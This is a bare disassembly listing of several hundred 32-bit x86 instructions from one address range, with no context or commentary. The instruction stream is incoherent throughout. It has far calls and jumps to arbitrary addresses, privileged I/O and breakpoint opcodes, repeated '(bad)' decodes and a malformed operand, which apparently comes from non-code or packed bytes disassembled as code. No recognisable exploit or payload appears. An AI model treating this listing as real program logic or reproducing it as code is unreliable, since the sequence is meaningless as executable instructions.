  406c7a:	stos   DWORD PTR es:[edi],eax
  406c7b:	neg    DWORD PTR [ebx-0x5a]
  406c7e:	push   0xf8a5c6aa
  406c83:	xchg   ebx,eax
  406c84:	outs   dx,DWORD PTR ds:[esi]
  406c85:	cmp    BYTE PTR [edi],dh
  406c87:	push   edx
  406c88:	jp     0x406cad
  406c8a:	add    eax,0xaac7b174
  406c8f:	xchg   cl,dl
  406c91:	lods   eax,DWORD PTR ds:[esi]
  406c92:	cmp    cl,bh
  406c94:	mov    esi,0x7539aef
  406c99:	outs   dx,DWORD PTR es:[esi]
  406c9b:	call   0xf972:0xcda7f4aa
  406ca2:	shr    ebp,0xc8
  406ca5:	test   BYTE PTR [ebx-0x13],0x25
  406ca9:	push   esi
  406caa:	mov    dl,0xf3
  406cac:	mov    ds:0x3d4dec7f,eax
  406cb1:	cli    
  406cb2:	sub    cl,BYTE PTR [ebx]
  406cb4:	mov    dh,0x75
  406cb6:	jle    0x406cf2
  406cb8:	lds    esp,FWORD PTR [ebx-0x302c7e4c]
  406cbe:	lar    eax,WORD PTR [esi+0x2b]
  406cc2:	xchg   edx,eax
  406cc3:	popf   
  406cc4:	jp     0x406c9e
  406cc6:	cmc    
  406cc7:	add    DWORD PTR [edi-0x218e093e],esp
  406ccd:	in     eax,dx
  406cce:	add    al,0x2d
  406cd0:	pushf  
  406cd1:	icebp  
  406cd2:	icebp  
  406cd3:	jmp    0x3f7f731b
  406cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cd9:	add    DWORD PTR [eax+ecx*1+0x14dbc7cc],esi
  406ce0:	sub    DWORD PTR [eax+0x54363e08],eax
  406ce6:	dec    ebx
  406ce7:	cmc    
  406ce8:	fld    TBYTE PTR [edx]
  406cea:	out    dx,al
  406ceb:	repz fwait
  406ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cee:	lods   al,BYTE PTR ds:[esi]
  406cef:	cmp    BYTE PTR [edi+eax*4+0x674e184d],0xaa
  406cf7:	scas   al,BYTE PTR es:[edi]
  406cf8:	and    eax,0xbf9cb950
  406cfd:	jmp    0x406d5c
  406cff:	loop   0x406d69
  406d01:	xchg   edx,eax
  406d02:	or     eax,DWORD PTR [esi+0x2b]
  406d05:	les    ebp,FWORD PTR [edx]
  406d07:	pop    ebp
  406d08:	adc    edx,edx
  406d0a:	mov    WORD PTR [edx-0x6b5b71bb],ds
  406d10:	cmp    ah,BYTE PTR [esi+0x3cefed8e]
  406d16:	enter  0xbfb9,0xcf
  406d1a:	scas   al,BYTE PTR es:[edi]
  406d1b:	inc    edx
  406d1c:	cli    
  406d1d:	gs push esi
  406d1f:	mov    eax,ds:0x5abb4f78
  406d24:	ret    0x9ad0
  406d27:	aam    0xe0
  406d29:	ror    DWORD PTR es:[ebx-0x3],0x51
  406d2e:	mov    ds:0x2b4176dc,al
  406d33:	mov    esi,0x72da2bc9
  406d38:	fld    TBYTE PTR [ebp-0x26]
  406d3b:	push   esi
  406d3c:	xchg   esi,eax
  406d3d:	mov    bh,0xad
  406d3f:	push   cs
  406d40:	shr    DWORD PTR [esi+0x6fb43a55],1
  406d46:	dec    ebx
  406d47:	cdq    
  406d48:	loopne 0x406d1a
  406d4a:	dec    ebp
  406d4b:	mov    ah,0x14
  406d4d:	lock sahf 
  406d4f:	pop    ss
  406d50:	and    al,0x4b
  406d52:	out    0x2e,eax
  406d54:	(bad)
  406d58:	add    al,0x9b
  406d5a:	add    al,0x62
  406d5c:	or     edx,DWORD PTR [edi]
  406d5e:	mov    esi,0xcd06cb4b
  406d63:	in     al,dx
  406d64:	fnstenv [edi-0x71]
  406d67:	xchg   edi,eax
  406d68:	dec    eax
  406d69:	jmp    0x2851a68c
  406d6e:	ret    0x81b0
  406d71:	test   DWORD PTR [eax],0x7f5a375
  406d77:	rcr    DWORD PTR [edx+edi*4],cl
  406d7a:	xchg   ecx,eax
  406d7b:	pop    ebp
  406d7c:	leave  
  406d7d:	mov    eax,0x4b969725
  406d82:	ror    BYTE PTR [eax+0x79e37968],cl
  406d88:	mov    ah,al
  406d8a:	(bad)  [ebx-0x16eecd3f]
  406d90:	daa    
  406d91:	jnp    0x406d29
  406d93:	jae    0x406d6e
  406d95:	jmp    0x5d1c:0x89414e53
  406d9c:	ja     0x406dcd
  406d9e:	mov    DWORD PTR [ebx+0x25],esp
  406da1:	dec    ecx
  406da2:	dec    ebp
  406da3:	jnp    0x406de3
  406da5:	inc    edi
  406da6:	popf   
  406da7:	test   BYTE PTR [eax+0x74],dh
  406daa:	cmp    al,0x8d
  406dac:	fs mov edi,0x8f5d277d
  406db2:	jl     0x406d60
  406db4:	cld    
  406db5:	loopne 0x406d6d
  406db7:	push   edx
  406db8:	cmp    bh,dl
  406dba:	push   ss
  406dbb:	inc    ecx
  406dbc:	jo     0x406da7
  406dbe:	add    al,0xc2
  406dc0:	adc    BYTE PTR [ebp+edx*8+0x2e],dh
  406dc4:	out    0x93,al
  406dc6:	and    ecx,DWORD PTR [ebx-0x5d]
  406dc9:	pop    es
  406dca:	ret    
  406dcb:	fldcw  WORD PTR [eax]
  406dcd:	mov    ebp,0x5c7ae733
  406dd2:	cmc    
  406dd3:	in     al,0x72
  406dd5:	sbb    ebx,DWORD PTR [edi]
  406dd7:	sub    cl,dh
  406dd9:	xor    DWORD PTR [edi-0x13],ebp
  406ddc:	pop    esp
  406ddd:	dec    ebp
  406dde:	rcr    DWORD PTR [edx-0x288fd4f5],0x91
  406de5:	mov    eax,0xc62b3289
  406dea:	push   ebp
  406deb:	ret    0x3fd6
  406dee:	xchg   ebp,eax
  406def:	jae    0x406d83
  406df1:	repnz in al,0xe3
  406df4:	outs   dx,DWORD PTR gs:[esi]
  406df6:	push   esi
  406df7:	pop    es
  406df8:	push   esp
  406df9:	shl    BYTE PTR [ecx],cl
  406dfb:	popa   
  406dfc:	mov    eax,0x73b56c05
  406e01:	js     0x406de5
  406e03:	ret    0xe709
  406e06:	push   cs
  406e07:	cmp    cl,al
  406e09:	icebp  
  406e0a:	ss push esp
  406e0c:	call   0xb99a:0x4a33c988
  406e13:	and    eax,0x3e3e635f
  406e18:	cld    
  406e19:	pop    esp
  406e1a:	sub    eax,0x696c9d87
  406e1f:	push   0xffffffb9
  406e21:	ja     0x406e6e
  406e23:	dec    edx
  406e24:	mov    ds:0x639de3a4,al
  406e29:	and    al,0x88
  406e2b:	jmp    ebx
  406e2d:	arpl   WORD PTR [esp+edx*4],ax
  406e30:	in     eax,0x94
  406e32:	xchg   ebp,eax
  406e33:	inc    eax
  406e34:	dec    eax
  406e35:	or     ah,BYTE PTR gs:[ebx-0x36]
  406e39:	mov    gs,WORD PTR [edi+esi*4+0x66]
  406e3d:	(bad)  
  406e3e:	cmp    BYTE PTR [esi+0xb],dl
  406e41:	and    DWORD PTR [edx+0x265a2ca6],esi
  406e47:	idiv   bh
  406e49:	sbb    dh,bl
  406e4b:	push   ds
  406e4c:	ret    0x12db
  406e4f:	out    dx,al
  406e50:	ror    BYTE PTR [edx+edi*4-0x70],1
  406e54:	pop    eax
  406e55:	add    BYTE PTR [esp+edi*2],ch
  406e58:	leave  
  406e59:	popa   
  406e5a:	mov    ds:0xb0ae99e,al
  406e5f:	jae    0x406eaf
  406e61:	into   
  406e62:	add    BYTE PTR [edx],al
  406e64:	push   esp
  406e65:	cmp    dl,BYTE PTR ds:0x7709d293
  406e6b:	jge    0x406e4f
  406e6d:	cs jb  0x406e7f
  406e70:	sbb    al,0x7d
  406e72:	icebp  
  406e73:	push   eax
  406e74:	inc    edi
  406e75:	cmp    edi,DWORD PTR [ecx+0x38]
  406e78:	or     bl,BYTE PTR [bp+si-0x3db4]
  406e7d:	and    al,BYTE PTR [esi+0x1d84e0ad]
  406e83:	sbb    cl,BYTE PTR [edx+0xd]
  406e86:	pop    es
  406e87:	cmc    
  406e88:	repnz faddp st(3),st
  406e8b:	or     eax,0x217a118f
  406e90:	hlt    
  406e91:	push   cs
  406e92:	jecxz  0x406eba
  406e94:	mov    al,ds:0xfbeebba0
  406e99:	ins    DWORD PTR es:[edi],dx
  406e9a:	xor    eax,DWORD PTR [esi+0x42b5ab04]
  406ea0:	sti    
  406ea1:	inc    ecx
  406ea2:	adc    DWORD PTR [esi],esp
  406ea4:	in     al,dx
  406ea5:	jmp    0x406e80
  406ea7:	mov    dh,0x2c
  406ea9:	adc    eax,0x7d9320b0
  406eae:	in     eax,0xca
  406eb0:	pop    esi
  406eb1:	mov    eax,ds:0x3639a0b1
  406eb6:	fwait
  406eb7:	jle    0x406eba
  406eb9:	mov    cs,esi
  406ebb:	aas    
  406ebc:	inc    ecx
  406ebd:	push   0xfffffff8
  406ebf:	retf   
  406ec0:	loop   0x406e4d
  406ec2:	leave  
  406ec3:	or     al,0x1c
  406ec5:	test   al,0xb6
  406ec7:	xor    ch,BYTE PTR [eax]
  406ec9:	inc    ecx
  406eca:	or     eax,0x2bde8871
  406ecf:	icebp  
  406ed0:	mov    cl,0x5b
  406ed2:	stc    
  406ed3:	jp     0x406eb8
  406ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ed6:	es (bad) 
  406ed8:	adc    BYTE PTR [ebx+0x19c5011e],bh
  406ede:	ds iret 
  406ee0:	push   0x2b3df385
  406ee5:	int3   
  406ee6:	pusha  
  406ee7:	jo     0x406f3a
  406ee9:	loop   0x406f42
  406eeb:	es xchg edi,eax
  406eed:	push   ss
  406eee:	jg     0x406e7c
  406ef0:	cwde   
  406ef1:	js     0x406f4c
  406ef3:	scas   al,BYTE PTR es:[edi]
  406ef4:	sbb    edx,ebp
  406ef6:	adc    ah,BYTE PTR [esi]
  406ef8:	sbb    al,0xb2
  406efa:	retf   
  406efb:	sbb    esp,ebp
  406efd:	call   0xecb9:0xa39a61ae
  406f04:	pop    ebx
  406f05:	sbb    ch,BYTE PTR [edx]
  406f07:	add    esi,DWORD PTR [eax-0x5db56afc]
  406f0d:	push   ds
  406f0e:	pop    edi
  406f0f:	lods   al,BYTE PTR ds:[esi]
  406f10:	lock rep lods al,BYTE PTR ds:[esi]
  406f13:	push   eax
  406f14:	and    eax,0xe1dd2266
  406f19:	adc    BYTE PTR [ebp*8-0x777fe737],bl
  406f20:	inc    eax
  406f21:	jg     0x406ec7
  406f23:	push   esp
  406f24:	jns    0x406f40
  406f26:	xor    edi,DWORD PTR [ebx]
  406f28:	lods   al,BYTE PTR ds:[esi]
  406f29:	push   ds
  406f2a:	frstpm(287 only) 
  406f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2d:	fldl2t 
  406f2f:	sub    eax,0x1421a92
  406f34:	sbb    ecx,esi
  406f36:	shl    BYTE PTR [edx-0x67],1
  406f39:	ja     0x406ee6
  406f3b:	dec    ebp
  406f3c:	int    0x44
  406f3e:	pop    esi
  406f3f:	ds int3 
  406f41:	pop    edx
  406f42:	int    0xc5
  406f44:	pop    eax
  406f45:	pop    esi
  406f46:	into   
  406f47:	std    
  406f48:	(bad)  
  406f4a:	cmp    al,0x0
  406f4c:	dec    esp
  406f4d:	(bad)  
  406f4e:	in     eax,dx
  406f4f:	and    BYTE PTR [edi-0x4e25337b],dl
  406f55:	adc    DWORD PTR [edx-0x51],ecx
  406f58:	retf   
  406f59:	xchg   BYTE PTR [ecx+0x15],al
  406f5c:	push   esi
  406f5d:	inc    ebp
  406f5e:	mov    bh,0x83
  406f60:	adc    BYTE PTR [esi-0xb],dl
  406f63:	nop
  406f64:	and    ah,BYTE PTR [eax]
  406f66:	mov    cl,0x47
  406f68:	rcl    DWORD PTR [edx-0x59],1
  406f6b:	div    BYTE PTR [edi+0x261e219a]
  406f71:	cmp    ch,BYTE PTR [bx+0x3c]
  406f75:	add    al,0x31
  406f77:	cdq    
  406f78:	sbb    ebp,ecx
  406f7a:	call   0xc351725f
  406f7f:	mov    eax,0x790965d1
  406f84:	mov    ds:0x18a35f04,eax
  406f89:	retf   0xdf0d
  406f8c:	je     0x406fad
  406f8e:	repz je 0x406fed
  406f91:	adc    BYTE PTR gs:[eax],ch
  406f94:	ds cld 
  406f96:	adc    BYTE PTR [edx+0x7929509d],cl
  406f9c:	xor    al,BYTE PTR ds:0x4e9545f1
  406fa2:	lock sar ah,cl
  406fa5:	mov    dl,0xf2
  406fa7:	inc    ebx
  406fa8:	not    BYTE PTR [eax+0x43]
  406fab:	xchg   esp,eax
  406fac:	cmc    
  406fad:	shl    ch,1
  406faf:	xchg   ebp,eax
  406fb0:	icebp  
  406fb1:	mov    ebx,0x341423c
  406fb6:	leave  
  406fb7:	popf   
  406fb8:	mov    ?,WORD PTR ds:0x6fabda13
  406fbe:	push   es
  406fbf:	sub    al,0x7d
  406fc1:	jecxz  0x406f55
  406fc3:	repnz and DWORD PTR [ebp+eiz*2-0x4120b36c],0xffffffe6
  406fcc:	dec    eax
  406fcd:	lds    esi,FWORD PTR [edi-0x30ebfa2c]
  406fd3:	jg     0x406fe1
  406fd5:	ss inc edi
  406fd7:	enter  0xb055,0x1a
  406fdb:	imul   edx,DWORD PTR [eax-0x50dae2b0],0xade807fb
  406fe5:	ja     0x407006
  406fe7:	pushf  
  406fe8:	inc    edx
  406fe9:	lea    ecx,[edx+ecx*4-0x64]
  406fed:	xchg   esp,eax
  406fee:	mov    ch,bh
  406ff0:	mov    ch,0x5d
  406ff2:	adc    eax,ecx
  406ff4:	mov    ebx,0x1239c06d
  406ff9:	loopne 0x40703f
  406ffb:	inc    eax
  406ffc:	jb     0x407041
  406ffe:	jmp    0x654b7182
  407003:	pusha  
  407004:	jne    0x406fdc
  407006:	loop   0x407057
  407008:	lock dec edi
  40700a:	rol    BYTE PTR [edx-0x64],cl
  40700d:	data16 cld 
  40700f:	popf   
  407010:	mov    ch,BYTE PTR [ebp+edi*1-0x51]
  407014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407015:	repnz (bad) 
  407017:	popf   
  407018:	mov    dh,0x85
  40701a:	inc    ecx
  40701b:	xchg   BYTE PTR [esi-0x7f299f77],dh
  407021:	std    
  407022:	sub    al,0xaf
  407024:	dec    eax
  407025:	mov    ds:0xca469f00,al
  40702a:	mov    ds,WORD PTR [esi+0x1d]
  40702d:	jmp    0x9fee27de
  407032:	(bad)  
  407033:	mov    esp,0x63ee70de
  407038:	jmp    0x37ed:0x599de40e
  40703f:	popf   
  407040:	mov    ch,0xaf
  407042:	(bad)  
  407043:	pop    esi
  407044:	jecxz  0x407055
  407046:	cmc    
  407047:	mov    DWORD PTR [ecx],edx
  407049:	jmp    0x406fe4
  40704b:	fnsave [edx+0x46]
  40704e:	out    dx,eax
  40704f:	sbb    eax,0x782d6e74
  407054:	xor    bl,BYTE PTR [esi-0x1cd3ed54]
  40705a:	and    eax,0xf8d1da80
  40705f:	inc    eax
  407060:	loopne 0x4070da
  407062:	arpl   WORD PTR [edx],si
  407064:	pop    edi
  407065:	adc    al,0xc5
  407067:	dec    ebp
  407068:	push   edx
  407069:	cmp    BYTE PTR [ecx-0x2c216021],ch
  40706f:	xchg   ebx,eax
  407070:	and    BYTE PTR ds:0x81d38497,al
  407076:	es xor al,0xf1
  407079:	inc    ebp
  40707a:	fs cwde 
  40707c:	jo     0x407037
  40707e:	xor    eax,0x51105059
  407083:	mov    bl,0x6
  407085:	or     ebx,DWORD PTR [ecx+eax*1+0x66140bd0]
  40708c:	sti    
  40708d:	jmp    FWORD PTR [ebp+eax*2-0x27]
  407091:	mov    dh,0x45
  407093:	(bad)  
  407096:	pop    ds
  407097:	and    edx,ebp
  407099:	xchg   ecx,eax
  40709a:	jns    0x407118
  40709c:	inc    edi
  40709d:	mov    dh,0x35
  40709f:	or     DWORD PTR [eax+eiz*1-0x276a0e6c],0x48
  4070a7:	mov    BYTE PTR [esi-0x68],dl
  4070aa:	and    ebx,DWORD PTR [ecx]
  4070ac:	cwde   
  4070ad:	push   ecx
  4070ae:	sub    DWORD PTR [edi+0x215721ca],esp
  4070b4:	(bad)  
  4070b5:	xor    BYTE PTR [eax],al
  4070b7:	sub    eax,0xa0ea9186
  4070bc:	dec    edx
  4070bd:	jne    0x40711f
  4070bf:	sub    ah,BYTE PTR [ebx+0x2d]
  4070c2:	dec    edi
  4070c3:	fwait
  4070c4:	sub    eax,0xa2be9d50
  4070c9:	int    0x2e
  4070cb:	pop    ecx
  4070cc:	mov    eax,0xa793e1ba
  4070d1:	push   cs
  4070d2:	xor    al,0x7d
  4070d4:	icebp  
  4070d5:	add    cl,bl
  4070d7:	sbb    al,0xbb
  4070d9:	rcl    BYTE PTR [esi+0x21530259],cl
  4070df:	cmp    DWORD PTR [esi+eiz*1+0x6bee5195],edx
  4070e6:	mov    ecx,0x1ab86e07
  4070eb:	test   DWORD PTR ds:0xdf2f1785,edi
  4070f1:	and    al,0xb9
  4070f4:	pop    ebp
  4070f5:	(bad)  
  4070f6:	leave  
  4070f7:	push   ss
  4070f8:	adc    ch,BYTE PTR [ebp+eiz*1+0x5e]
  4070fc:	add    BYTE PTR [esi+ebp*1+0x1],al
  407100:	mov    bl,0x9f
  407102:	stc    
  407103:	adc    al,0x4d
  407105:	inc    ecx
  407106:	clc    
  407107:	iret   
  407108:	dec    esi
  407109:	lea    ebx,[edx+0x7dcdc942]
  40710f:	outs   dx,DWORD PTR ds:[esi]
  407110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407111:	add    BYTE PTR [edx-0x7939ee87],al
  407117:	jbe    0x407170
  407119:	xor    BYTE PTR [esi+edi*4-0x21],bl
  40711d:	mov    edx,0xed04788b
  407122:	out    dx,eax
  407123:	inc    ebp
  407124:	std    
  407125:	sbb    al,0xc5
  407127:	sub    eax,ebx
  407129:	inc    esp
  40712a:	jne    0x4070b4
  40712c:	shl    DWORD PTR [ecx-0x52bdc24b],1
  407132:	div    BYTE PTR [ebx+eiz*1-0x6e8847b7]
  407139:	pushf  
  40713a:	push   esi
  40713b:	mov    eax,0xd2734337
  407140:	icebp  
  407141:	loope  0x407135
  407143:	ins    DWORD PTR es:[edi],dx
  407144:	xor    bl,BYTE PTR [esi-0x7b0b0432]
  40714a:	push   edi
  40714b:	push   es
  40714c:	adc    ecx,ecx
  40714e:	shl    BYTE PTR [edi-0x4548100b],0xc9
  407155:	fcomp  DWORD PTR [ebx-0x39]
  407158:	add    eax,0xf926ddc4
  40715d:	out    0x64,al
  40715f:	in     eax,dx
  407160:	adc    dh,BYTE PTR [edx+0x307ef880]
  407166:	mov    eax,0xf8111a46
  40716b:	test   eax,0x7b508c0d
  407170:	int3   
  407171:	push   eax
  407172:	not    BYTE PTR [ebp+0x6a]
  407175:	je     0x40710d
  407177:	jb     0x407141
  407179:	add    BYTE PTR [edi+0x76],al
  40717c:	(bad)  
  40717e:	push   ebx
  40717f:	popa   
  407180:	sbb    esi,DWORD PTR [eax+0x8001550]
  407186:	mov    bl,0x26
  407188:	pushf  
  407189:	xor    BYTE PTR [esi-0x23],bl
  40718c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40718d:	xchg   ebx,eax
  40718e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40718f:	add    DWORD PTR [esi-0x29],0x37e4b797
  407196:	dec    BYTE PTR [edx+ebx*1-0x2aa2fdc2]
  40719d:	sub    eax,DWORD PTR [ecx]
  40719f:	pop    ebx
  4071a0:	cwde   
  4071a1:	enter  0x9e9,0x51
  4071a5:	imul   esi,DWORD PTR ds:0xae825bce,0x16
  4071ac:	scas   eax,DWORD PTR es:[edi]
  4071ad:	outs   dx,DWORD PTR ds:[esi]
  4071ae:	or     DWORD PTR [esi+0x5e],0x8e9d6771
  4071b5:	scas   al,BYTE PTR es:[edi]
  4071b6:	or     BYTE PTR [ebx-0x5c],al
  4071b9:	mov    bl,0x5
  4071bb:	pop    ds
  4071bc:	and    DWORD PTR [edx+0x18],ebx
  4071bf:	pop    esp
  4071c0:	jae    0x407212
  4071c2:	jae    0x4071a1
  4071c4:	xor    eax,0x7c620097
  4071c9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4071cb:	push   edi
  4071cc:	push   ds
  4071cd:	xchg   esp,eax
  4071ce:	sub    DWORD PTR [edx-0x32],eax
  4071d1:	xchg   edx,eax
  4071d2:	std    
  4071d3:	push   ebp
  4071d4:	xor    bh,ch
  4071d6:	ret    
  4071d7:	adc    edx,ebp
  4071d9:	jmp    0xbefe:0x1ee054f7
  4071e0:	fidiv  WORD PTR [edx-0x3d]
  4071e3:	fbld   TBYTE PTR [eax]
  4071e5:	fcmovnb st,st(3)
  4071e7:	(bad)  
  4071e8:	rol    DWORD PTR [ecx+0x42],1
  4071eb:	add    dh,BYTE PTR [esi+0x651a30e3]
  4071f1:	fldenv [edi+ecx*2+0x7d]
  4071f5:	adc    ah,bl
  4071f7:	dec    eax
  4071f8:	shl    DWORD PTR [eax+eiz*8],0x49
  4071fc:	jecxz  0x407270
  4071fe:	or     bl,BYTE PTR [edi]
  407200:	hlt    
  407201:	and    cl,ch
  407203:	pop    ebp
  407204:	fist   DWORD PTR [edi]
  407206:	cs jg  0x407228
  407209:	sub    eax,0x39f7c85c
  40720e:	or     al,0x35
  407210:	mov    esp,edi
  407212:	loop   0x4071ce
  407214:	(bad)  
  407215:	lods   eax,DWORD PTR ds:[esi]
  407216:	ret    
  407217:	mov    edx,0x2ad45f4b
  40721c:	jno    0x407264
  40721e:	loopne 0x407267
  407220:	aaa    
  407221:	inc    esp
  407222:	mov    cs,edx
  407224:	std    
  407225:	lds    esp,FWORD PTR [ebx-0x9b31e16]
  40722b:	mov    edx,0xae1ead7b
  407230:	(bad)  
  407231:	inc    edx
  407232:	sbb    BYTE PTR [ecx+0x5f],ch
  407235:	std    
  407236:	or     DWORD PTR [esi-0x7db41b8e],eax
  40723c:	popa   
  40723d:	mov    esi,0x69677440
  407242:	cmp    ecx,DWORD PTR [ebp-0x7fe3d6bb]
  407248:	add    ah,BYTE PTR [edx-0x64]
  40724b:	add    ch,BYTE PTR [ecx+0x6c48945f]
  407251:	jno    0x40723e
  407253:	mov    dl,0x6
  407255:	jp     0x40725c
  407257:	rcl    BYTE PTR [esp+ecx*4],1
  40725a:	pop    ebp
  40725b:	test   al,0x6d
  40725d:	xchg   ecx,eax
  40725e:	adc    dl,BYTE PTR [ebp-0x2982f153]
  407264:	ds repnz test al,0x7
  407268:	jp     0x407240
  40726a:	sti    
  40726b:	rcr    BYTE PTR [eax+0x60],0x23
  40726f:	test   BYTE PTR [eax],al
  407271:	ret    
  407272:	mov    edi,DWORD PTR [esi-0x1]
  407275:	ffreep st(6)
  407277:	pop    esi
  407278:	ins    DWORD PTR es:[edi],dx
  407279:	jecxz  0x407291
  40727b:	or     BYTE PTR [ecx+0x21c767dc],dl
  407281:	and    DWORD PTR [eax],ecx
  407283:	pop    ebx
  407284:	dec    esp
  407285:	and    eax,0x6a9f4503
  40728a:	adc    BYTE PTR [eax+ecx*8-0x702d9f8b],al
  407291:	push   esp
  407292:	xchg   edx,eax
  407293:	loope  0x40724c
  407295:	(bad)  
  407297:	aad    0xc8
  407299:	dec    edi
  40729a:	lea    eax,[eax-0x6c]
  40729d:	pop    esi
  40729e:	(bad)  
  40729f:	pop    eax
  4072a0:	aaa    
  4072a1:	out    0xfa,eax
  4072a3:	fmul   DWORD PTR [edi+0x2a85bd3e]
  4072a9:	xchg   ebp,eax
  4072aa:	fsub   DWORD PTR [edi+0x4c]
  4072ad:	fucom  st(1)
  4072af:	aaa    
  4072b0:	xor    BYTE PTR [eax+0x2],0x1b
  4072b4:	std    
  4072b5:	mov    esp,0x78e8e8d5
  4072ba:	sqrtps xmm2,XMMWORD PTR [ebx+0x9]
  4072be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072bf:	rol    BYTE PTR [edi+esi*1-0x53],cl
  4072c3:	sbb    BYTE PTR [esi-0x5d],dh
  4072c6:	test   eax,0xad93732c
  4072cb:	jbe    0x4072f7
  4072cd:	ficomp WORD PTR [esi+0x47131a0b]
  4072d3:	adc    DWORD PTR [edi+0x4],0x6ed91dd0
  4072da:	xor    eax,0x156bb09f
  4072df:	inc    eax
  4072e0:	mov    bh,bl
  4072e2:	and    eax,edx
  4072e4:	fwait
  4072e5:	xchg   BYTE PTR [edi],al
  4072e7:	imul   ecx,DWORD PTR [edi+ebp*4-0x38982546],0xffffffa8
  4072ef:	pop    ds
  4072f0:	lds    ecx,FWORD PTR [eax]
  4072f2:	(bad)  
  4072f3:	hlt    
  4072f4:	sbb    ah,ah
  4072f6:	ins    BYTE PTR es:[edi],dx
  4072f7:	loope  0x407302
  4072f9:	jno    0x4072c8
  4072fb:	push   ebp
  4072fc:	push   ebp
  4072fd:	mov    ch,0x27
  4072ff:	mov    bh,0x1d
  407301:	jbe    0x4072df
  407303:	mov    BYTE PTR [edx],al
  407305:	sub    al,BYTE PTR [ecx-0x2]
  407308:	add    DWORD PTR [eax+eiz*2],ecx
  40730b:	push   edi
  40730c:	mov    ah,0xe
  40730e:	xchg   esp,eax
  40730f:	xchg   ebx,ebp
  407311:	fadd   DWORD PTR [ecx]
  407313:	out    dx,al
  407314:	pop    es
  407315:	adc    al,0x60
  407317:	rcr    BYTE PTR [eax],0x98
  40731a:	push   ds
  40731b:	push   edi
  40731c:	xchg   ebp,eax
  40731d:	cmp    ebx,DWORD PTR [ebp-0x1ff97250]
  407323:	jno    0x407351
  407325:	inc    ebp
  407326:	adc    ah,BYTE PTR [ebp+0x7e]
  407329:	je     0x40736c
  40732b:	repz add al,0x2d
  40732e:	mov    eax,ds:0x2cfbd825
  407333:	push   ss
  407334:	push   edx
  407335:	fmul   st,st(3)
  407337:	adc    eax,0x7ddccd53
  40733c:	jl     0x407337
  40733e:	push   esp
  40733f:	adc    al,0x2b
  407341:	mov    ds:0x99314822,eax
  407346:	dec    ebx
  407347:	sub    BYTE PTR ds:0xa87e3c6f,ah
  40734d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40734e:	dec    ebx
  40734f:	mov    esp,DWORD PTR [edi]
  407351:	scas   al,BYTE PTR es:[edi]
  407352:	push   ecx
  407353:	sub    DWORD PTR [ebp+0x288bb46b],ecx
  407359:	scas   eax,DWORD PTR es:[edi]
  40735a:	mov    ecx,DWORD PTR [edi-0x444f5023]
  407360:	cli    
  407361:	sub    al,0xf
  407363:	and    al,dl
  407365:	and    esp,DWORD PTR [esi+0x71]
  407368:	das    
  407369:	sbb    BYTE PTR [ecx],cl
  40736b:	popf   
  40736c:	popf   
  40736d:	es je  0x407303
  407370:	test   BYTE PTR [edx],0xca
  407373:	inc    edx
  407374:	addr16 mov bl,0xed
  407377:	or     ch,BYTE PTR [eax+0x3a]
  40737a:	dec    edi
  40737b:	xchg   BYTE PTR [edx+0x7a6433ce],ah
  407381:	(bad)  
  407382:	not    ebp
  407384:	pop    edx
  407385:	daa    
  407386:	or     dl,BYTE PTR [edx]
  407388:	(bad)  
  407389:	stos   DWORD PTR es:[edi],eax
  40738a:	push   ds
  40738b:	jl     0x407382
  40738d:	mov    WORD PTR [ebx-0x7bef088f],ss
  407393:	test   eax,0x30531a65
  407398:	sar    BYTE PTR gs:[ebx+eax*4],1
  40739c:	inc    ebx
  40739d:	popa   
  40739e:	xor    ah,BYTE PTR [ecx]
  4073a0:	outs   dx,BYTE PTR ds:[esi]
  4073a1:	popf   
  4073a2:	sub    al,0xce
  4073a4:	xchg   ebp,eax
  4073a5:	adc    DWORD PTR [ebp+0x31],0xd0f41b7
  4073ac:	inc    ebx
  4073ad:	adc    al,0x51
  4073af:	cmp    BYTE PTR [esp+edx*1-0x78],al
  4073b3:	stos   DWORD PTR es:[edi],eax
  4073b4:	inc    ebx
  4073b5:	les    ebx,FWORD PTR [edx]
  4073b7:	sub    BYTE PTR [ecx+eiz*4+0x54923c74],0x3b
  4073bf:	mov    cl,BYTE PTR [edx+0x27]
  4073c2:	mov    al,ds:0xbec3e75
  4073c7:	adc    eax,0x3e4d1873
  4073cc:	xor    esi,eax
  4073ce:	push   esp
  4073cf:	call   0xb4ab3d99
  4073d4:	jno    0x407429
  4073d6:	out    0xc5,al
  4073d8:	mov    ds:0x3fd09555,al
  4073dd:	push   ebp
  4073de:	push   ebx
  4073df:	shl    DWORD PTR fs:[edx+ebp*8+0x15d9182d],cl
  4073e7:	xchg   BYTE PTR [esi],ah
  4073e9:	mov    al,ds:0x7db0f599
  4073ee:	xchg   ebp,eax
  4073ef:	stos   BYTE PTR es:[edi],al
  4073f0:	sahf   
  4073f1:	(bad)  
  4073f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f3:	arpl   si,ax
  4073f5:	loopne 0x407426
  4073f7:	jl     0x40738b
  4073f9:	fwait
  4073fa:	sub    BYTE PTR [edi+0x6c],0x33
  4073fe:	scas   al,BYTE PTR es:[edi]
  4073ff:	sbb    eax,0x71c478b5
  407404:	mov    ch,ah
  407406:	jb     0x4073d2
  407408:	sub    BYTE PTR [ebp-0x3c138f08],al
  40740e:	mov    al,ds:0x992396e9
  407413:	mov    ds:0xd26dabf,eax
  407418:	mov    esp,DWORD PTR [eax+0x5ff2dcf1]
  40741e:	xchg   ebp,eax
  40741f:	jb     0x40740f
  407421:	adc    ah,BYTE PTR [edx+0x37d414c0]
  407427:	xchg   ebp,eax
  407428:	xlat   BYTE PTR ds:[ebx]
  407429:	inc    ecx
  40742a:	cmp    BYTE PTR [ebp-0x79],0xda
  40742e:	add    al,0xf4
  407430:	push   esi
  407431:	scas   al,BYTE PTR es:[edi]
  407432:	dec    eax
  407433:	or     al,0x8a
  407435:	test   al,0x1d
  407437:	ret    0x8331
  40743a:	push   edx
  40743b:	call   0xdc87deaa
  407440:	popa   
